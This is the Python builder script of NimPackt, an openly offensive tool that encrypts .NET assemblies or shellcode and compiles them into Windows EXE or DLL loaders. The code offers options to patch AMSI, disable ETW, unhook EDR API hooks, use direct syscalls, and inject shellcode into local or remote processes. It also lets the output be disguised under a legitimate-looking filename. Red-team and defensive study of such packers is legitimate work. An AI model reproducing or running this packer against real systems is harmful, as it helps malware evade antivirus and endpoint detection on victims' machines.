#!/usr/bin/python3

  #-----
  #
  #   NimPackt - a Nim-Based C# (.NET) binary executable wrapper for OpSec & Profit
  #   By Cas van Cooten (@chvancooten)
  #
  #   This script formats the .NET bytecode and compiles the nim code.
  #   For usage please refer to README.md
  #
  #-----
  #
  #   References:
  #
  #       Based on OffensiveNim by Marcello Salvati (@byt3bl33d3r)
  #       https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim
  #       https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_amsiPatch_bin.nim
  #
  #
  #       Also inspired by the below post by Fabian Mosch (@S3cur3Th1sSh1t)
  #       https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
  #
  #-----

import sys
import argparse
import binascii
import os
import base64
from hashlib import sha1
from Crypto.Cipher import AES
from Crypto.Util import Counter

scriptDir = os.path.dirname(__file__)
templateDir = os.path.join(scriptDir, "templates")
outDir = os.path.join(scriptDir, "output")

def getSha1Sum(file):
    BUF_SIZE = 65536
    Sha1Sum = sha1()
    with open(file, 'rb') as f:
        while True:
            data = f.read(BUF_SIZE)
            if not data:
                break
            Sha1Sum.update(data)
    return Sha1Sum.hexdigest()

def int_of_string(s):
    return int(binascii.hexlify(s), 16)

def encrypt_message(key, iv, plaintext):
    ctr = Counter.new(128, initial_value=int_of_string(iv))
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)
    return iv + aes.encrypt(plaintext)

def cryptFiles(inFilename, unhookApis, x64):
    if not os.path.exists(inFilename):
        raise SystemExit("ERROR: Input file is not valid.")

    print("Encrypting binary to embed...")
    with open(inFilename,'rb') as inFile:
        plaintext = inFile.read()
        key =  os.urandom(16) # AES-128, so 16 bytes
        iv = os.urandom(16)
        ciphertext = encrypt_message(key, iv, plaintext)

        # Pass the encrypted string, skipping the IV portion
        cryptedInput = f"let b64buf = \"{str(base64.b64encode(ciphertext[16:]), 'utf-8')}\""

        # Define as bytearray to inject in Nim source code
        cryptIV = f"let cryptIV: array[{len(iv)}, byte] = [byte "
        cryptIV = cryptIV + ",".join ([f"{x:#0{4}x}" for x in iv])
        cryptIV = cryptIV + "]"

        # cryptKey is defined as a const to place it at a different spot in the binary
        cryptKey = f"const cryptKey: array[{len(key)}, byte] = [byte "
        cryptKey = cryptKey + ",".join ([f"{x:#0{4}x}" for x in key])
        cryptKey = cryptKey + "]"

    if unhookApis:
        if x64:
            with open(os.path.join(scriptDir, 'dist/shellycoat_x64.bin'),'rb') as coatFile:
                plaintext = coatFile.read()
                cipherCoat = encrypt_message(key, iv, plaintext)
                cryptedCoat = f"let cryptedCoat = \"{str(base64.b64encode(cipherCoat[16:]), 'utf-8')}\""
        else:
            raise SystemExit("ERROR: Bypassing user-mode API hooks is not supported in 32-bit mode.")
    else:
        cryptedCoat = "let cryptedCoat = \"\"" # This implies disabling UM API unhooking

    return cryptedInput, cryptedCoat, cryptIV, cryptKey

def parseArguments(inArgs):
    # Construct the packed arguments in the right format (array split on space)
    if not inArgs:
        result = 'let arr = toCLRVariant([""], VT_BSTR)'
    elif inArgs == "PASSTHRU":
        result = 'let arr = toCLRVariant(commandLineParams(), VT_BSTR)'
    else:
        parsedArgs = inArgs.split(" ")
        parsedArgs = ', '.join('"{0}"'.format(w.replace('\\', '\\\\')) for w in parsedArgs)
        result = f'let arr = toCLRVariant([{parsedArgs}], VT_BSTR)'

    return result
        
def generateSource_ExecuteAssembly(inFileName, outFileName, cryptedInput, cryptedCoat, cryptIV, cryptKey, argString):
    # Construct the Nim source file based on the passed arguments
    tplFileName = "NimPackt-Template.nim"

    result = ""
    with open(os.path.join(templateDir, tplFileName),'r') as templateFile:
        for line in templateFile:
            new_line = line.rstrip()
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#', cryptedCoat)
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
            new_line = new_line.replace('#[ PLACEHOLDERARGUMENTS ]#', argString)
            result += new_line +"\n"

    if outFileName:
        outFileName = os.path.join(outDir, outFileName + ".nim")
    else:
        outFileName = os.path.join(outDir, os.path.splitext(os.path.basename(inFileName))[0].replace('-', '') + "ExecAssemblyNimPackt.nim")

    if not os.path.exists(outDir):
        os.makedirs(outDir)

    with open(outFileName, 'w') as outFile:
        outFile.write(result)
        print("Prepared Nim source file.")

    return outFileName

def generateSource_Shinject(inFileName, outFileName, cryptedInput, cryptedCoat, cryptIV, cryptKey):
    # Construct the Nim source file based on the passed arguments
    tplFileName = "NimPackt-Template.nim"

    result = ""
    with open(os.path.join(templateDir, tplFileName),'r') as templateFile:
        for line in templateFile:
            new_line = line.rstrip()
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#', cryptedCoat)
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
            result += new_line +"\n"

    if outFileName:
        outFileName = os.path.join(outDir, outFileName + ".nim")
    else:
        outFileName = os.path.join(outDir, os.path.splitext(os.path.basename(inFileName))[0].replace('-', '') + "ShinjectNimPackt.nim")

    if not os.path.exists(outDir):
        os.makedirs(outDir)

    with open(outFileName, 'w') as outFile:
        outFile.write(result)
        print("Prepared Nim source file.")

    return outFileName

def generateSource_RemoteShinject(inFileName, outFileName, cryptedInput, cryptedCoat, cryptIV, cryptKey, injecttarget, existingprocess):
    # Construct the Nim source file based on the passed arguments
    tplFileName = "NimPackt-Template.nim"

    result = ""
    with open(os.path.join(templateDir, tplFileName),'r') as templateFile:
        for line in templateFile:
            new_line = line.rstrip()
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#', cryptedCoat)
            new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
            new_line = new_line.replace('#[ PLACEHOLDERTARGETPROC ]#', f"var tProc: string = \"{injecttarget}\"")
            new_line = new_line.replace('#[ PLACEHOLDERNEWPROC ]#', f"var nProc: bool = {str(not existingprocess).lower()}")
            result += new_line +"\n"

    if outFileName:
        outFileName = os.path.join(outDir, outFileName + ".nim")
    else:
        outFileName = os.path.join(outDir, os.path.splitext(os.path.basename(inFileName))[0].replace('-', '') + "RemoteShinjectNimPackt.nim")

    if not os.path.exists(outDir):
        os.makedirs(outDir)

    with open(outFileName, 'w') as outFile:
        outFile.write(result)
        print("Prepared Nim source file.")

    return outFileName

def compileNim(fileName, fileType, executionMode, localInject, showConsole, unhookApis, useSyscalls, sleep, disableAmsi, disableEtw, x64, verbose, debug):
    # Compile the generated Nim file for Windows (cross-compile if run from linux)
    # Compilation flags are focused on stripping and optimizing the output binary for size
    if x64:
        cpu = "amd64"
    else:
        cpu = "i386"
    
    if showConsole:
        gui = "console"
    else:
        gui = "gui"

    try:
        compileCommand = f"nim c -d:strip -d:release --opt:size --hints:off --warnings:off --app:{gui} --cpu={cpu}"

        if useSyscalls:
            compileCommand = compileCommand + " -d:syscalls"

        if sleep:
            compileCommand = compileCommand + " -d:calcPrimes"

        if unhookApis:
            compileCommand = compileCommand + " -d:patchApiCalls"

        if disableAmsi:
            compileCommand = compileCommand + " -d:patchAmsi"

        if disableEtw:
            compileCommand = compileCommand + " -d:disableEtw"

        if verbose:
            compileCommand = compileCommand + " -d:verbose"

        if executionMode == "execute-assembly":
            compileCommand = compileCommand + " -d:executeAssembly"
        
        elif executionMode == "shinject" and localInject == True:
            compileCommand = compileCommand + " -d:shinject"
        
        elif executionMode == "shinject" and localInject == False:
            compileCommand = compileCommand + " -d:remoteShinject"

        if fileType == "dll":
            compileCommand = compileCommand + " --app=lib --nomain -d:exportDll"
            outFileName = os.path.splitext(fileName)[0] + ".dll"
        else:
            compileCommand = compileCommand + " -d:exportExe"
            outFileName = os.path.splitext(fileName)[0] + ".exe"

        if os.name == 'nt':
            # Windows
            print("Compiling Nim binary (this may take a while)...")
        else:
            # Other (Unix)
            print("Cross-compiling Nim binary for Windows (this may take a while)...")
            compileCommand = compileCommand + " -d=mingw"

        compileCommand = compileCommand + f" {fileName}"
        if debug:
            print(f"[DEBUG] Compilation command: '{compileCommand}'.")
        os.system(compileCommand)
    except:
        e = sys.exc_info()[0]
        raise SystemExit(f"There was an error compiling the binary: {e}")

    if not debug:
        os.remove(fileName)
    
    print(f"Compiled Nim binary to {outFileName}!")
    print(f"SHA1 hash of file to use as IOC: {getSha1Sum(outFileName)}")
    if fileType == "dll":
        print(f"Trigger dll by calling 'rundll32 {os.path.basename(outFileName)},IconSrv'")
    print("Go forth and make a Nimpackt that matters")
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser._action_groups.pop()
    required = parser.add_argument_group('required arguments')
    assembly = parser.add_argument_group('execute-assembly arguments')
    injection = parser.add_argument_group('shinject arguments')
    optional = parser.add_argument_group('other arguments')

    required.add_argument('-e', '--executionmode', action='store', dest='executionmode', help='Execution mode of the packer. Supports "execute-assembly" or "shinject"', required=True)
    required.add_argument('-i', '--inputfile', action='store', dest='inputfile', help='C# .NET binary executable (.exe) or shellcode (.bin) to wrap', required=True)
    assembly.add_argument('-a', '--arguments', action='store', dest='arguments', default="PASSTHRU", help='Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (default)')
    assembly.add_argument('-na', '--nopatchamsi', action='store_false', default=True, dest='patchAmsi', help='Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)')
    assembly.add_argument('-ne', '--nodisableetw', action='store_false', default=True, dest='disableEtw', help='Do NOT disable Event Tracing for Windows (ETW)')
    injection.add_argument('-r', '--remote', action='store_false', dest='localinject', default=True, help='Inject shellcode into remote process (default false)')
    injection.add_argument('-t', '--target', action='store', dest='injecttarget', help='Remote thread targeted for remote process injection')
    injection.add_argument('-E', '--existing', action='store_true', dest='existingprocess', default=False, help='Remote inject into existing process rather than a newly spawned one (default false, implies -r) (WARNING: VOLATILE)')
    optional.add_argument('-o', '--outfile', action='store', dest='outputfile', help='Filename of the output file (e.g. "LegitBinary"). Specify WITHOUT extension or path. This property will be stored in the output binary as the original filename')
    optional.add_argument('-nu', '--nounhook', action='store_false', default=True, dest='unhookApis', help='Do NOT unhook user-mode API hooks in the target process by loading a fresh NTDLL.dll')
    optional.add_argument('-ns', '--nosyscalls', action='store_false', default=True, dest='useSyscalls', help='Do NOT use direct syscalls (Windows generation 7-10) instead of high-level APIs to evade EDR')
    optional.add_argument('-f', '--filetype', action='store', default="exe", dest='filetype', help='Filetype to compile ("exe" or "dll", default: "exe")')
    optional.add_argument('-s', '--sleep', action='store_true', default=False, dest='sleep', help='Sleep for approx. 30 seconds by calculating primes')
    optional.add_argument('-32', '--32bit', action='store_false', default=True, dest='x64', help='Compile in 32-bit mode (untested)')
    optional.add_argument('-S', '--showConsole', action='store_true', default=False, dest='showConsole', help='Show a console window with the app\'s output when running')
    optional.add_argument('-d', '--debug', action='store_true', default=False, dest='debug', help='Enable debug mode (retains .nim source file in output folder)')
    optional.add_argument('-v', '--verbose', action='store_true', default=False, dest='verbose', help='Print debug messages of the wrapped binary at runtime')
    optional.add_argument('-V', '--version', action='version', version='%(prog)s v1.0 "I should learn how to code"-edition')

    args = parser.parse_args()

    if args.executionmode == "shinject" and (args.arguments not in ["", "PASSTHRU"] or args.patchAmsi != True or args.disableEtw != True):
        print("WARNING: Execute-assembly arguments (-a, -na, -ne) will be ignored in 'shinject' mode.")

    if args.executionmode == "execute-assembly" and (args.localinject == False or args.injecttarget != "explorer.exe" or args.existingprocess == True):
        print("WARNING: Shinject arguments (-r, -t, -E) will be ignored in 'execute-assembly' mode.")

    if args.executionmode == "shinject" and args.existingprocess == True:
        print("WARNING: ⚠ Injecting into existing processes is VERY volatile and is likely to CRASH the target process when exited. USE WITH CAUTION. ⚠")

    if args.executionmode == "execute-assembly" and args.filetype == "dll":
        print("WARNING: DLL files will not show console output. Make sure to pack your assembly with arguments to write to output file if you want the output.")

    if args.executionmode == "execute-assembly" and args.showConsole == False:
        print("WARNING: Assembly will be executed in GUI mode without a console! Recompile with the -S flag to show a console window with output on the target.")   

    if args.x64 == False:
        print("WARNING: Compiling in x86 mode may cause crashes. Compile generated .nim file manually in this case. Forcing debug mode...")
        args.debug = True

    if args.x64 == False and args.useSyscalls == True:
        raise SystemExit("ERROR: Using direct syscalls is not supported in x86. Change to x64 or disable syscalls with -ns.")

    if args.x64 == False and args.unhookApis == True:
        raise SystemExit("ERROR: Unhooking APIs is not supported in x86. Change to x64 or disable unhooking with -nu.")

    if args.executionmode == "shinject" and (args.injecttarget is not None or args.existingprocess == True):
        args.localinject = False

    if args.executionmode == "shinject":
        args.patchAmsi = False
        args.disableEtw = False

    # Fix an optimization bug preventing injections from working
    # This has opsec implications, obviously. Left as exercise to the reader ;)
    if args.localinject == False and args.useSyscalls == True:
        args.verbose = True

    cryptedInput, cryptedCoat, cryptIV, cryptKey = cryptFiles(args.inputfile, args.unhookApis, args.x64)

    argString = parseArguments(args.arguments)

    if args.executionmode == "execute-assembly":
        sourceFile = generateSource_ExecuteAssembly(args.inputfile, args.outputfile, cryptedInput, cryptedCoat,
            cryptIV, cryptKey, argString)
    elif args.executionmode == "shinject" and args.localinject == True:
        sourceFile = generateSource_Shinject(args.inputfile, args.outputfile, cryptedInput, cryptedCoat,
            cryptIV, cryptKey)
    elif args.executionmode == "shinject" and args.localinject == False:
        sourceFile = generateSource_RemoteShinject(args.inputfile, args.outputfile, cryptedInput, cryptedCoat,
            cryptIV, cryptKey, args.injecttarget, args.existingprocess)
    else:
        raise SystemExit("ERROR: Argument 'executionmode' is not valid. Please specify either 'execute-assembly' or 'shinject'.")

    compileNim(sourceFile, args.filetype, args.executionmode, args.localinject, args.showConsole, args.unhookApis,
        args.useSyscalls, args.sleep, args.patchAmsi, args.disableEtw, args.x64, args.verbose, args.debug)